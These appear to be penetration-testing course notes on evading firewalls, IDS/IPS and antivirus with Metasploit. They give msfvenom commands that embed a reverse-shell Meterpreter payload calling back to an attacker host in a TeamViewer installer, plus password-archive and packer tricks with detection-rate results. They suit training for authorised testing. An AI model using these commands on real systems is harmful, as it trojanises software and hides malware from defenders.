# 14 — Firewall and IDS/IPS Evasion

## Overview

Understanding how targets are defended is essential for effective exploitation. Defenses fall into two categories: **endpoint protection** (host-level) and **perimeter protection** (network edge). This section covers detection methods and practical evasion techniques using MSF tools.

---

## Defense Categories

### Endpoint Protection

| Feature | Description |
|---------|-------------|
| **What** | Software installed on individual hosts |
| **Includes** | Antivirus, antimalware, host firewall, anti-DDoS |
| **Examples** | Avast, Nod32, Malwarebytes, BitDefender, Windows Defender |
| **Focus** | Protects a single machine |

### Perimeter Protection

| Feature | Description |
|---------|-------------|
| **What** | Physical or virtual devices at the network edge |
| **Includes** | Firewalls, IDS/IPS, WAFs, UTM appliances |
| **Zones** | Outside (Internet) → DMZ (public servers) → Inside (private network) |
| **Focus** | Controls traffic flow between trust zones |

---

## Detection Methods

| Method | Description | What It Catches |
|--------|-------------|-----------------|
| **Signature-based** | Compares packets/files against known attack patterns. 100% match = alarm | Known exploits, known malware hashes |
| **Heuristic / Statistical Anomaly** | Behavioral comparison against established baseline. Deviation = alarm | Unknown malware, APT-style attacks |
| **Stateful Protocol Analysis** | Detects divergence from accepted protocol definitions | Protocol abuse, tunneling |
| **SOC Live Monitoring** | Human analysts monitor feeds + automated alerting | Everything above + context-based threats |

---

## Evasion Techniques

### 1. AES-Encrypted Meterpreter Traffic (MSF6)

MSF6 automatically encrypts all Meterpreter communications with AES — handles most network-based IDS/IPS.

| Feature | Detail |
|---------|--------|
| **What** | AES-encrypted tunnel between attacker and victim |
| **Handles** | Network packet inspection, protocol analysis |
| **Limitation** | IP-based blocking can still flag the connection |

### 2. Backdoored Executables (Executable Templates)

Inject payload into a legitimate executable to hide it within real application code.

```bash
msfvenom windows/x86/meterpreter_reverse_tcp \
  LHOST=10.10.14.2 LPORT=8080 \
  -k \
  -x ~/Downloads/TeamViewer_Setup.exe \
  -e x86/shikata_ga_nai \
  -a x86 --platform windows \
  -o ~/Desktop/TeamViewer_Setup.exe \
  -i 5
```

| Flag | Purpose |
|------|---------|
| `-x <template>` | Use this executable as a template |
| `-k` | Keep original executable behavior running (separate thread) |
| `-e` | Encoder to use |
| `-i` | Encoding iterations |

> **Note**: With `-k`, the backdoored app runs normally. Without it, the app appears to do nothing (suspicious). However, if launched from CLI, a separate window may pop up.

### 3. Password-Protected Archives

Double-archive with passwords and remove file extensions to bypass signature scanning.

```bash
# Step 1: Generate payload
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 \
  -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5

# Step 2: Archive with password
rar a ~/test.rar -p ~/test.js

# Step 3: Remove extension
mv test.rar test

# Step 4: Archive again with password
rar a test2.rar -p test

# Step 5: Remove extension again
mv test2.rar test2
```

#### Detection Results Comparison

| Payload State | VirusTotal Detection |
|--------------|---------------------|
| Raw `.js` payload with SGN encoding | **11/59** detected |
| Double-archived + password + no extension | **0/49** detected |

> **Downside**: Password-protected archives show as "unable to scan" in AV dashboards — may trigger manual inspection by admins.

### 4. Packers

Compress the executable + payload + decompression code into a single file. Runs transparently like the original.

| Packer | Description |
|--------|-------------|
| **UPX** | Most popular, open-source |
| **The Enigma Protector** | Commercial-grade protection |
| **MPRESS** | Fast compression |
| **Themida** | Advanced anti-debugging + packing |
| **ExeStealth** | Stealth-focused packer |
| **Morphine** | Polymorphic packer |
| **MEW** | Minimal footprint |
| **Alternate EXE Packer** | Simple, lightweight |

### 5. Exploit Code Randomization

For custom BoF exploits — randomize patterns to break IDS signatures:

```ruby
# Add offset variation to avoid signature matching
'Targets' =>
[
    [ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
],
```

| Technique | Purpose |
|-----------|---------|
| Randomize buffer patterns | Break IDS signature matching on hex patterns |
| Avoid obvious NOP sleds | IDS checks for `\x90` NOP chains |
| Test in sandbox first | Only get one shot on real assessment |

---

## Evasion Effectiveness Summary

| Technique | Network IDS/IPS | Endpoint AV | Difficulty |
|-----------|----------------|-------------|------------|
| AES-encrypted Meterpreter (MSF6) | **Evades** | N/A | Built-in |
| Encoding (SGN × multiple) | Minimal | **~20% evasion** | Easy |
| Backdoored executables (`-x -k`) | N/A | **Moderate evasion** | Easy |
| Password-protected archives | N/A | **High evasion** | Easy |
| Packers (UPX, Themida) | N/A | **Moderate-High** | Medium |
| Custom exploit randomization | **Evades** | N/A | Hard |
| Meterpreter in-memory execution | N/A | **Evades disk forensics** | Built-in |

---

## Real-World Reference: Equifax Hack (2017)

| Detail | Description |
|--------|-------------|
| **Vulnerability** | Apache Struts RCE |
| **Evasion** | DNS exfiltration — slow data siphon through DNS queries |
| **Duration** | Months undetected |
| **Lesson** | Sometimes the best evasion is using trusted protocols (DNS, HTTPS) |

---

## Key Takeaways

| Concept | Remember |
|---------|----------|
| **MSF6 encrypts Meterpreter with AES** | Handles network-level IDS/IPS automatically |
| **Encoding alone is insufficient** | SGN × 10 still detected by ~80% of AV |
| **Backdoored executables lower detection** | `-x` for template, `-k` to keep original functionality |
| **Double-archive + password = 0 detections** | But shows as "cannot scan" to admins |
| **Meterpreter = memory-only** | No disk artifacts → evades traditional forensics |
| **Packers add another layer** | UPX is easiest, Themida is most advanced |
| **Sandbox test before deployment** | You may only get one chance on a real engagement |
| **This is a high-level overview** | Dedicated evasion modules go much deeper |
